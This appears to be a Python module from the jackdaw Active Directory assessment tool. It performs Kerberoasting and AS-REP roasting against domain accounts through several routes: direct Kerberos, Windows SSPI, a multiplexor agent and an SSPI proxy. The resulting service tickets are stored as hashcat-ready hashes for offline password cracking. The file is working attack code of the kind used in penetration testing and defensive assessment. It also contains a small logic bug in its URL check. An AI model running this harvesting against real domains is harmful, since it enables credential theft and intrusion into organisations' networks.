
import platform
import logging
from urllib.parse import urlparse, parse_qs

from jackdaw import logger
from jackdaw.dbmodel.kerberoast import Kerberoast as KerberoastTable
from jackdaw.dbmodel.adinfo import ADInfo
from jackdaw.dbmodel.adcomp import Machine
from jackdaw.dbmodel.aduser import ADUser
from jackdaw.dbmodel import get_session, windowed_query

from minikerberos.common.utils import TGSTicket2hashcat
from minikerberos.common.spn import KerberosSPN
from minikerberos.common.target import KerberosTarget
from minikerberos.security import KerberosUserEnum, APREPRoast, Kerberoast
from minikerberos.common.creds import KerberosCredential
from minikerberos.common.url import KerberosClientURL

from msldap.authentication.kerberos.gssapi import get_gssapi, GSSWrapToken, KRB5_MECH_INDEP_TOKEN
from minikerberos.protocol.asn1_structs import AP_REQ, TGS_REQ

from jackdaw.gatherer.progress import *

class KerberoastGatherer:
	def __init__(self, db_conn, ad_id, progress_queue = None, show_progress = True, kerb_url = None, domain_name = None):
		self.db_conn = db_conn
		self.ad_id = ad_id
		self.kerb_url = kerb_url
		self.kerb_mgr = None
		self.domain_name = domain_name
		self.session = None
		self.progress_queue = progress_queue
		self.show_progress = show_progress

		self.targets_spn = {}
		self.targets_asreq = {}
		self.total_targets = 0
		self.total_targets_finished = 0

	async def asreproast(self):
		try:
			target = None
			if self.kerb_url == 'auto':
				from winacl.functions.highlevel import get_logon_info
				logon = get_logon_info()
				if logon['logonserver'] == '':
					logger.debug('Failed to detect logonserver! asreproast will not work automagically!')
					return True, None

				target = KerberosTarget()
				target.ip = '%s.%s' % (logon['logonserver'], logon['dnsdomainname'])

			else:
				target = self.kerb_mgr.get_target()

			for uid in self.targets_asreq:
				ar = APREPRoast(target)
				res = await ar.run(self.targets_asreq[uid], override_etype = [23])
				t = KerberoastTable.from_hash(self.ad_id, uid, res)
				self.session.add(t)
				self.total_targets_finished += 1

				if self.progress_queue is not None:
					msg = GathererProgress()
					msg.type = GathererProgressType.KERBEROAST
					msg.msg_type = MSGTYPE.PROGRESS 
					msg.adid = self.ad_id
					msg.domain_name = self.domain_name
					msg.total = self.total_targets
					msg.total_finished = self.total_targets_finished
					msg.step_size = 1
					await self.progress_queue.put(msg)
				
			self.session.commit()
			return True, None
		except Exception as e:
			return None, e

	async def kerberoast_sspi(self):
		try:
			from winsspi.sspi import KerberoastSSPI

			for uid in self.targets_spn:
				try:
					spn_name = '%s@%s' % (self.targets_spn[uid].username, self.targets_spn[uid].domain)
					if spn_name[:6] == 'krbtgt':
						continue
					ksspi = KerberoastSSPI()
					try:
						ticket = ksspi.get_ticket_for_spn(spn_name)
					except Exception as e:
						logger.debug('Error getting ticket for %s' % spn_name)
						continue

					t = KerberoastTable.from_hash(self.ad_id, uid, TGSTicket2hashcat(ticket))
					self.session.add(t)

					self.total_targets_finished += 1
					if self.progress_queue is not None:
						msg = GathererProgress()
						msg.type = GathererProgressType.KERBEROAST
						msg.msg_type = MSGTYPE.PROGRESS 
						msg.adid = self.ad_id
						msg.domain_name = self.domain_name
						msg.total = self.total_targets
						msg.total_finished = self.total_targets_finished
						msg.step_size = 1
						await self.progress_queue.put(msg)

				except Exception as e:
					logger.debug('Could not fetch tgs for %s' % uid)
			self.session.commit()

			return True, None
		except Exception as e:
			return None, e

	async def kerberoast_multiplexor(self):
		try:
			from multiplexor.operator.external.sspi import KerberosSSPIClient
			from multiplexor.operator import MultiplexorOperator
		except ImportError as error:
			return None, Exception('Failed to import multiplexor module! You will need to install multiplexor to get this working!')

		try:
			ws_logger = logging.getLogger('websockets')
			ws_logger.setLevel(100)
			url_e = urlparse(self.kerb_url)
			agentid = url_e.path.replace('/','')
			operator = MultiplexorOperator(self.kerb_url)
			await operator.connect()
			#creating virtual sspi server
			for uid in self.targets_spn:
				try:
					server_info = await operator.start_sspi(agentid)
					#print(server_info)
					sspi_url = 'ws://%s:%s' % (server_info['listen_ip'], server_info['listen_port'])
					#print(sspi_url)
					ksspi = KerberosSSPIClient(sspi_url)
					await ksspi.connect()

					apreq, err = await ksspi.authenticate(self.targets_spn[uid].get_formatted_pname())
					if err is not None:
						logger.debug('[SPN-MP] error occurred while roasting %s: %s' % (self.targets_spn[uid].get_formatted_pname(), err))
						continue
					unwrap = KRB5_MECH_INDEP_TOKEN.from_bytes(apreq)
					aprep = AP_REQ.load(unwrap.data[2:]).native
					
					t = KerberoastTable.from_hash(self.ad_id, uid, TGSTicket2hashcat(aprep))
					self.session.add(t)

					self.total_targets_finished += 1
					if self.progress_queue is not None:
						msg = GathererProgress()
						msg.type = GathererProgressType.KERBEROAST
						msg.msg_type = MSGTYPE.PROGRESS 
						msg.adid = self.ad_id
						msg.domain_name = self.domain_name
						msg.total = self.total_targets
						msg.total_finished = self.total_targets_finished
						msg.step_size = 1
						await self.progress_queue.put(msg)

				except Exception as e:
					logger.debug('[SPN-MP] Error while roasting %s. %s' % (uid, e))
				finally:
					try:
						await ksspi.disconnect()
					except:
						pass

			self.session.commit()
		except Exception as e:
			return None, e

	async def kerberoast_sspiproxy(self):
		try:
			from pyodidewsnet.sspiproxyws import SSPIProxyWS
			
			url = self.kerb_url
			agentid = None
			o = urlparse(self.kerb_url)
			if o.query:
				q = parse_qs(o.query)
				agentid = q.get('agentid', [None])[0]
				if agentid is not None:
					agentid = bytes.fromhex(agentid)
			
			for uid in self.targets_spn:
				if self.targets_spn[uid].get_formatted_pname().lower().startswith('krbtgt'):
					continue
				sspi = SSPIProxyWS(url, agentid)
				status, ctxattr, apreq, err = await sspi.authenticate('KERBEROS', '', self.targets_spn[uid].get_formatted_pname(), 3, 2048, authdata = b'')
				if err is not None:
					print(err.__traceback__)
					print('Failed to get ticket for %s Reason: %s' % (self.targets_spn[uid].get_formatted_pname(), str(err)))
					continue
				
				unwrap = KRB5_MECH_INDEP_TOKEN.from_bytes(apreq)
				aprep = AP_REQ.load(unwrap.data[2:]).native
				t = KerberoastTable.from_hash(self.ad_id, uid, TGSTicket2hashcat(aprep))
				self.session.add(t)

				self.total_targets_finished += 1
				if self.progress_queue is not None:
					msg = GathererProgress()
					msg.type = GathererProgressType.KERBEROAST
					msg.msg_type = MSGTYPE.PROGRESS 
					msg.adid = self.ad_id
					msg.domain_name = self.domain_name
					msg.total = self.total_targets
					msg.total_finished = self.total_targets_finished
					msg.step_size = 1
					await self.progress_queue.put(msg)

			self.session.commit()
		except Exception as e:
			return None, e
	
	async def kerberoast(self):
		try:
			for uid in self.targets_spn:
				try:
					cred = self.kerb_mgr.get_creds()
					target = self.kerb_mgr.get_target()
					ar = Kerberoast(target, cred)
					
					hashes = await ar.run([self.targets_spn[uid]], override_etype = [23, 17, 18])
					for h in hashes:
						t = KerberoastTable.from_hash(self.ad_id, uid, h)
						self.session.add(t)

						self.total_targets_finished += 1
						if self.progress_queue is not None:
							msg = GathererProgress()
							msg.type = GathererProgressType.KERBEROAST
							msg.msg_type = MSGTYPE.PROGRESS 
							msg.adid = self.ad_id
							msg.domain_name = self.domain_name
							msg.total = self.total_targets
							msg.total_finished = self.total_targets_finished
							msg.step_size = 1
							await self.progress_queue.put(msg)

				except Exception as e:
					logger.debug('Could not fetch tgs for %s' % uid)
			self.session.commit()
			return True, None
		except Exception as e:
			return None, e

	async def get_targets(self):
		try:
			q_asrep = self.session.query(ADUser).filter_by(ad_id = self.ad_id).filter(ADUser.UAC_DONT_REQUIRE_PREAUTH == True)
			q_spn = self.session.query(ADUser).filter_by(ad_id = self.ad_id).filter(ADUser.servicePrincipalName != None)
			
			for user in q_asrep.all():
				if user.sAMAccountName == 'krbtgt':
					continue
				cred = KerberosCredential()
				cred.username = user.sAMAccountName
				cred.domain = self.domain_name
				self.targets_asreq[user.id] = cred
				self.total_targets += 1

			for user in q_spn.all():
				if user.sAMAccountName == 'krbtgt':
					continue
				target = KerberosSPN()
				target.username = user.sAMAccountName
				target.domain = self.domain_name
				self.targets_spn[user.id] = target
				self.total_targets += 1

			return True, None
		except Exception as e:
			return None, e
		

	async def run(self):
		try:
			if self.progress_queue is not None:
				msg = GathererProgress()
				msg.type = GathererProgressType.KERBEROAST
				msg.msg_type = MSGTYPE.STARTED
				msg.adid = self.ad_id
				msg.domain_name = self.domain_name
				await self.progress_queue.put(msg)

			self.session = get_session(self.db_conn)
			if self.domain_name is None:
				info = self.session.query(ADInfo).get(self.ad_id)
				self.domain_name = str(info.distinguishedName).replace(',','.').replace('DC=','')

			_, err = await self.get_targets()
			if err is not None:
				raise err

			if len(self.targets_asreq) == 0 and len(self.targets_spn) == 0:
				logger.debug('No targets found!')
				return True, None

			if self.kerb_url == 'auto':
				if platform.system() == 'Windows':
					_, err = await self.asreproast()
					if err is not None:
						raise err

					_, err = await self.kerberoast_sspi()
					if err is not None:
						raise err
					return True, None
				else:
					raise Exception('No kerberos URL was provided and not running on Windows!')
			
			elif self.kerb_url.startswith('kerberos'):
				self.kerb_mgr = KerberosClientURL.from_url(self.kerb_url)
				_, err = await self.asreproast()
				if err is not None:
					raise err

				_, err = await self.kerberoast()
				if err is not None:
					raise err
			
			elif self.kerb_url.startswith('ws'):
				if self.kerb_url.find('type=sspiproxy'):
					await self.kerberoast_sspiproxy()
				else:
					await self.kerberoast_multiplexor()

			return True, None
		except Exception as e:
			return None, e
		finally:
			if self.progress_queue is not None:
				msg = GathererProgress()
				msg.type = GathererProgressType.KERBEROAST
				msg.msg_type = MSGTYPE.FINISHED
				msg.adid = self.ad_id
				msg.domain_name = self.domain_name
				await self.progress_queue.put(msg)